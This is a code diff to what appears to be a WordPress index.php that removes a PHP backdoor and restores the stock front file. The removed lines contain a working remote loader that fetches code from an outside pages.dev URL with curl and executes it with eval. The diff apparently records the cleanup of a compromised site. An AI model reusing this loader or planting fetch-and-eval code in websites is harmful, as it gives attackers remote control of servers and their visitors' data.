@@ -1,28 +1,17 @@
 <?php
-$url = "https://69hektar.pages.dev/umsu/fai/lp.txt";
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-if ($result === false) {
-    echo "Error fetching remote content";
-} else {
-    // Assuming $result contains PHP code, execute it
-    if (is_string($result)) {
-        // Start output buffering
-        ob_start();
-        // Execute the fetched PHP code
-        eval('?>'.$result);
-        // Get the output buffer content and clean it
-        $output = ob_get_clean();
-        // Echo the output
-        echo $output;
-    } else {
-        echo "Error: Invalid response from remote server";
-    }
-}
-
-curl_close($ch);
-?>
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
